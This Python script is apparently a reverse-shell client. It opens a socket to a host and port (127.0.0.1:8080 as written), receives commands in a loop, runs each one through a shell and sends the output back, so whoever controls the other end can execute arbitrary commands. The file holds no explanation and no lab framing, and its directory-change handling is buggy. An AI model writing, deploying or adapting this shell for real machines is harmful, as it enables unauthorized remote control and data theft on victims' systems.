
#import pyautogui
#pyautogui.hotkey("win","ctrl","d")#powerful
import socket
import os
from subprocess import Popen,PIPE
host="127.0.0.1"
port=8080
print((host,port))
server=socket.socket()
server.connect((host,int(port)))

while True:
    try:
        command=server.recv(1024)
        command=command.decode("UTF-8")
        print(command)
        if "cd" in command:
            pros=Popen([_ for _ in command.split(" ")],shell=True,stdout=PIPE,stderr=PIPE,stdin=PIPE)
            res,err=pros.communicate()      
            os.chdir(res.decode("UTF-8"))
            if res != None:
                server.send(res)
            else:
                server.send(err)
        else:
            pros=Popen([_ for _ in command.split(" ")],shell=True,stdout=PIPE,stderr=PIPE,stdin=PIPE)
            res,err=pros.communicate()      
            if res != None:
                server.send(res)
            else:
                server.send(err)
    except Exception as e:
        print(e)

